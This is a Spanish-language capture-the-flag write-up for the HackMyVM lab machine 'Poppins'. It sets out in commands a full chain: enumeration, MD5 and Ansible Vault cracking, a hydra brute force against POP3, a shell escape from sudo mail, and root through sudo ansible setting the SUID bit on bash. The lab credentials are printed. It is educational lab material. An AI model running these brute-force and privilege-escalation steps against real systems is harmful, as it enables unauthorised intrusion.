# 🎯 Poppins - HackMyVM

## 📋 Info

| Campo      | Detalle                                      |
|------------|----------------------------------------------|
| Máquina    | Poppins (HMVM-Poppins)                       |
| Plataforma | HackMyVM                                     |
| Dificultad | Media-Alta                                   |
| OS         | Debian GNU/Linux (Kernel 4.19.0-27-amd64)   |
| IP         | 192.168.0.43                                 |
| Tema       | Mary Poppins                                 |

---

## 🔍 Reconocimiento

```bash
sudo arp-scan -l
nmap -sV -sC -p- 192.168.0.43
```

**Puertos abiertos:**

| Puerto | Estado | Servicio | Versión                        |
|--------|--------|----------|-------------------------------|
| 22/tcp | open   | SSH      | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 80/tcp | open   | HTTP     | Apache httpd 2.4.38           |
| 110/tcp | open  | POP3     | Dovecot pop3d                 |
| 995/tcp | open  | POP3S    | Dovecot pop3d (SSL)           |

---

## 🌐 Enumeración Web

### Página principal — Personajes como usuarios

La página muestra temática de Mary Poppins con los personajes:
`Mary`, `Bert`, `George`, `Winifred`, `Jane`, `Michael` → **usuarios potenciales del sistema**.

### Path oculto — supercalifragilisticexpialidocious

Enumeración recursiva con `ffuf` revela una ruta que deletrea la famosa palabra:

```bash
ffuf -u http://192.168.0.43/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -recursion -recursion-depth 30 \
  -mc 200,301
```

**Ruta encontrada:**
```
/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/
```

### Pista en index.html

El código fuente contiene:
```html
<!-- check for backup files -->
```

### Gobuster con extensión .bak

```bash
gobuster dir \
  -u http://192.168.0.43/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x .bak \
  -b 403,404
```

**Resultado:** `hash.bak` — archivo con 100 hashes MD5.

---

## 🔓 Crackeo de Hashes MD5

`hash.bak` contiene 100 hashes MD5. Se crackean con hashcat:

```bash
hashcat -m 0 hash.bak /usr/share/wordlists/rockyou.txt
```

**Resultado:** 100 hashes → 100 contraseñas en claro guardadas en `cracked_pass.txt`.

---

## 📬 POP3 Brute Force

El servidor POP3 acepta cualquier usuario (todos devuelven `+OK`, sin enumeración posible).

Creamos la lista de usuarios del sitio web:

```bash
echo -e "mary\nbert\ngeorge\nwinifred\njane\nmichael" > poppins_users.txt
```

Ataque con hydra (hilos bajos para evitar desconexiones):

```bash
hydra -L poppins_users.txt -P cracked_pass.txt pop3://192.168.0.43 -f -t 2 -W 3
```

**Credenciales válidas:** `bert:jmac92777`

---

## 📧 Lectura de Emails vía POP3S

```bash
openssl s_client -connect 192.168.0.43:995 -quiet
```

```
USER bert
PASS jmac92777
LIST
RETR 1
```

**Contenido:** Email de `jane@poppins` con un **Ansible Vault cifrado** (`$ANSIBLE_VAULT;1.1;AES256`).

---

## 🔑 Crackeo del Ansible Vault

Guardamos el vault en un archivo (sin espacios antes de `$ANSIBLE_VAULT`):

```bash
cat > secrets.yml << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
66626631636362303332633238373338386634373434646532656534323230333938303331663630
3236333934663930343263363831353138323630393134320a366366393939373636386538336336
34353536656637313762323832643339633234656635326137633439303730373335386536306436
6335363366376634630a326563623737626337353436323565643365333061663661396337613731
3730
EOF
```

Convertir a formato john y crackear:

```bash
python3 /usr/share/john/ansible2john.py secrets.yml > vault_hash.txt
john vault_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Vault password:** `javiel`

Descifrar el vault:

```bash
ansible-vault view secrets.yml
# Password: javiel
```

**Contenido:** contraseña de `michael` = `cumibug`

---

## 🚪 Acceso SSH

```bash
ssh jane@192.168.0.43
# Password: javiel (la misma del vault)
```

> `michael` solo acepta autenticación por clave pública (no password).  
> `bert` tiene credenciales válidas pero su shell es `/usr/sbin/nologin`.

---

## 🔄 Movimiento Lateral

### jane → michael

```bash
jane@Poppins:~$ su michael
Password: cumibug
michael@Poppins:~$
```

### michael → winifred

```bash
michael@Poppins:~$ sudo -l
# (winifred) PASSWD: /usr/bin/mail *
```

Ejecutar `mail` como `winifred` y escapar con `!/bin/bash`:

```bash
sudo -u winifred /usr/bin/mail
# Dentro del prompt de mail:
& !/bin/bash
winifred@Poppins:~$
```

---

## ⬆️ Escalada de Privilegios

```bash
winifred@Poppins:~$ sudo -l
# (ALL) NOPASSWD: /usr/bin/ansible *
```

Ansible permite ejecutar módulos de shell como root:

```bash
sudo /usr/bin/ansible localhost -m shell -a 'chmod u+s /bin/bash'
bash -p
# ROOT!
```

---

## 🚩 Flags

| Flag | Valor             |
|------|-------------------|
| User | `flag{user-...}`  |
| Root | `flag{root-...}`  |

---

## 🗺️ Cadena de Ataque

```
nmap → puertos 22, 80, 110, 995
    │
Web (personajes) → usuarios potenciales
    │
ffuf recursivo → /s/u/p/e/r/.../s/ (supercalifragilisticexpialidocious)
    │
"check for backup files" → gobuster -x .bak → hash.bak
    │
hashcat MD5 → 100 contraseñas en claro
    │
hydra POP3 (-t 2 -W 3) → bert:jmac92777
    │
openssl POP3S → email de jane → Ansible Vault cifrado
    │
ansible2john + john → vault password: javiel
    │
ansible-vault view → michael:cumibug
    │
SSH jane:javiel → su michael (cumibug)
    │
sudo -u winifred /usr/bin/mail → !/bin/bash → winifred
    │
sudo /usr/bin/ansible → shell module → chmod u+s /bin/bash → bash -p
    │
ROOT ✓
```

---

## 📚 Lecciones Aprendidas

1. **ffuf recursivo para rutas largas:** La ruta `/supercalifragilisticexpialidocious/` letra a letra requería enumeración recursiva. Sin `-recursion`, jamás se habría encontrado.

2. **Leer el código fuente siempre:** El comentario `<!-- check for backup files -->` era la pista directa para probar extensiones `.bak`.

3. **POP3 no enumera usuarios:** Todos los usuarios devuelven `+OK`. No se puede saber si existen antes de hacer brute force. Hay que probar con todos los candidatos del sitio.

4. **Credencial válida ≠ acceso shell:** `bert:jmac92777` es correcto en POP3 pero su shell es `nologin`. Siempre verificar el tipo de acceso que da cada credencial.

5. **Probar todas las credenciales contra todos los servicios:** La contraseña del vault (`javiel`) era también la contraseña SSH de `jane`. Mapear credenciales × servicios sistemáticamente.

6. **Espacios en archivos vault:** Un espacio antes de `$ANSIBLE_VAULT` hace fallar `ansible2john`. Verificar el contenido exacto con `cat -A secrets.yml`.

7. **Hydra en POP3 con hilos bajos:** Demasiados hilos causan desconexiones. Usar `-t 2 -W 3` en servicios sensibles a la concurrencia.

8. **Escape de mail con `!/bin/bash`:** El binario `mail` permite ejecutar comandos del sistema con `!`. Es una técnica clásica de GTFOBins para movimiento lateral y escalada.

9. **Ansible como vector de escalada:** El módulo `shell` de Ansible ejecuta comandos arbitrarios. Con `sudo NOPASSWD`, es escalada directa a root.
